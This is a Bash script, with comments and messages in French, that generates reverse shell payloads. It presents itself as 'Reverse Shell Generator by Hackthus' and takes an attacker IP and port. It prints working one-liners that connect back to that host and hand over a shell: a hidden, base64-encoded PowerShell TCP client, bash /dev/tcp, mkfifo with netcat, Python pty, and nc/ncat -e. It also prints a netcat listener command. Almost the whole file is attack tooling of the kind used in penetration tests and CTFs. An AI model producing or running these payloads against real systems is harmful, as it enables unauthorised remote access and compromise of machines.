#!/bin/bash

# =========================
#  Couleurs
# =========================
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[1;33m"
CYAN="\033[0;36m"
NC="\033[0m"

# =========================
#  Banner
# =========================
print_banner() {
    echo -e "${GREEN}"
    echo "  ██████╗ ██████╗ ██╗   ██╗███████╗██╗  ██╗██████╗ ██╗     ██╗     "
    echo "  ██╔══██╗╚════██╗██║   ██║██╔════╝██║  ██║╚════██╗██║     ██║     "
    echo "  ██████╔╝ █████╔╝██║   ██║███████╗███████║ █████╔╝██║     ██║     "
    echo "  ██╔══██╗ ╚═══██╗╚██╗ ██╔╝╚════██║██╔══██║ ╚═══██╗██║     ██║     "
    echo "  ██║  ██║██████╔╝ ╚████╔╝ ███████║██║  ██║██████╔╝███████╗███████╗"
    echo "  ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝"
    echo -e "${CYAN}               Reverse Shell Generator by Hackthus${NC}"
    echo -e "${GREEN}  ══════════════════════════════════════════════════════════${NC}\n"
}

# =========================
#  Fonction d'aide
# =========================
usage() {
    echo -e "${YELLOW}Usage:${NC} $0 --host <IP> --port <PORT> [--type powershell|bash|python|all]"
    echo ""
    echo -e "  ${CYAN}--host${NC}   IP de l'attaquant (ex: 10.10.14.5)"
    echo -e "  ${CYAN}--port${NC}   Port d'écoute (ex: 4444)"
    echo -e "  ${CYAN}--type${NC}   Type de payload (défaut: powershell)"
    echo -e "           Valeurs: powershell, bash, python, nc, all"
    echo ""
    exit 1
}

# =========================
#  Affichage section
# =========================
print_section() {
    echo -e "\n${CYAN}[${NC}${GREEN} $1 ${NC}${CYAN}]${NC}"
    
}

# =========================
#  Vérification dépendances
# =========================
check_deps() {
    local missing=()
    for cmd in nc iconv base64 rlwrap; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Dépendances manquantes (optionnelles): ${missing[*]}${NC}"
    fi
}

# =========================
#  Validation IP
# =========================
validate_ip() {
    if ! [[ "$HOST" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo -e "${RED}[-] Format IP invalide: $HOST${NC}"
        exit 1
    fi
    # Vérification de chaque octet
    IFS='.' read -r -a octets <<< "$HOST"
    for octet in "${octets[@]}"; do
        if [ "$octet" -gt 255 ]; then
            echo -e "${RED}[-] Octet invalide dans l'IP: $octet${NC}"
            exit 1
        fi
    done
}

# =========================
#  Validation Port
# =========================
validate_port() {
    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
        echo -e "${RED}[-] Port invalide: $PORT (doit être entre 1 et 65535)${NC}"
        exit 1
    fi
}

# =========================
#  Netcat listener
# =========================
show_listener() {
    print_section "Netcat Listener"
    echo -e "  > nc -lvnp $PORT"
    if command -v rlwrap &>/dev/null; then
        echo -e "  > rlwrap nc -lvnp $PORT ${YELLOW}# (recommandé historique + readline)${NC}"
    fi
    echo ""
}

# =========================
#  Payload PowerShell
# =========================
payload_powershell() {
    print_section "PowerShell"

    # Vérification des outils nécessaires
    if ! command -v iconv &>/dev/null || ! command -v base64 &>/dev/null; then
        echo -e "  ${RED}[-] iconv ou base64 manquant encodage impossible${NC}"
        return 1
    fi

    local RAW="\$client = New-Object System.Net.Sockets.TCPClient('$HOST',$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \". { \$data } 2>&1\" | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

    local PAYLOAD
    PAYLOAD=$(echo -n "$RAW" | iconv -t UTF-16LE | base64 -w 0)

    if [ -z "$PAYLOAD" ]; then
        echo -e "  ${RED}[-] Erreur lors de l'encodage du payload${NC}"
        return 1
    fi

    echo -e "  ${YELLOW}# One-liner encodé (Base64 UTF-16LE)${NC}"
    echo -e "  powershell -nop -w hidden -enc $PAYLOAD"
    echo ""
    echo -e "  ${YELLOW}# Raw${NC}"
    echo -e "  $RAW"
}

# =========================
#  Payload Bash
# =========================
payload_bash() {
    print_section "Bash"
    echo -e "  ${YELLOW}# /dev/tcp${NC}"
    echo -e "  bash -i >& /dev/tcp/$HOST/$PORT 0>&1"
    echo ""
    echo -e "  ${YELLOW}# mkfifo (plus stable)${NC}"
    echo -e "  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST $PORT >/tmp/f"
    echo ""
    #echo -e "  ${YELLOW}# Bash Read Line${NC}"
    #echo -e "  exec 5<>/dev/tcp/$HOST/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"
}

# =========================
#  Payload Python
# =========================
payload_python() {
    print_section "Python"
    echo -e "  ${YELLOW}# Python 3 (pty)${NC}"
    echo -e "  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$HOST\",$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo ""
    echo -e "  ${YELLOW}# Python 2 fallback${NC}"
    echo -e "  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

# =========================
#  Payload PHP
# =========================
#payload_php() {
#    print_section "PHP"
#    echo -e "  ${YELLOW}# exec (simple)${NC}"
#   echo -e "  php -r '\$sock=fsockopen(\"$HOST\",$PORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
#    echo ""
#    echo -e "  ${YELLOW}# Passthru (alternative)${NC}"
#    echo -e "  php -r '\$s=fsockopen(\"$HOST\",$PORT);while(!feof(\$s)){passthru(fgets(\$s));}'"
#}

# =========================
#  Payload Netcat
# =========================
payload_nc() {
    print_section "Netcat"

    echo -e "  ${YELLOW}# nc classique -e (BusyBox, anciennes versions)${NC}"
    echo -e "  nc -e /bin/sh $HOST $PORT"
    echo ""
    echo -e "  ${YELLOW}# nc sans -e (mkfifo) le plus universel${NC}"
    echo -e "  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST $PORT >/tmp/f"
    echo ""
    echo -e "  ${YELLOW}# ncat (nmap) supporte -e nativement${NC}"
    echo -e "  ncat -e /bin/bash $HOST $PORT"

}

# =========================
#  Valeur par défaut
# =========================
TYPE="powershell"

# =========================
#  Parsing arguments
# =========================
ARGS=$(getopt -o "" --long host:,port:,type:,help -n "$0" -- "$@" 2>/dev/null)

[ $? -ne 0 ] && usage

eval set -- "$ARGS"

while true; do
    case "$1" in
        --host)   HOST="$2";  shift 2 ;;
        --port)   PORT="$2";  shift 2 ;;
        --type)   TYPE="$2";  shift 2 ;;
        --help)   print_banner; usage ;;
        --)       shift; break ;;
        *)        usage ;;
    esac
done

# =========================
#  Vérification args
# =========================
if [ -z "$HOST" ] || [ -z "$PORT" ]; then
    print_banner
    usage
fi

validate_ip
validate_port

# =========================
#  Affichage principal
# =========================
print_banner
check_deps

echo -e "${GREEN}[+] Host  : $HOST${NC}"
echo -e "${GREEN}[+] Port  : $PORT${NC}"
echo -e "${GREEN}[+] Type  : $TYPE${NC}"

show_listener

# =========================
#  Dispatch
# =========================
case "$TYPE" in
    powershell) payload_powershell ;;
    bash)       payload_bash ;;
    python)     payload_python ;;
#    php)        payload_php ;;
    nc)         payload_nc ;;
    all)
        payload_powershell
        payload_bash
        payload_python
#        payload_php
        payload_nc
        ;;
    *)
        echo -e "${RED}[-] Type inconnu: $TYPE${NC}"
        echo -e "${YELLOW}[!] Types valides: powershell, bash, python, nc, all${NC}"
        exit 1
        ;;
esac

echo -e "\n${GREEN}[+] Done.${NC}\n"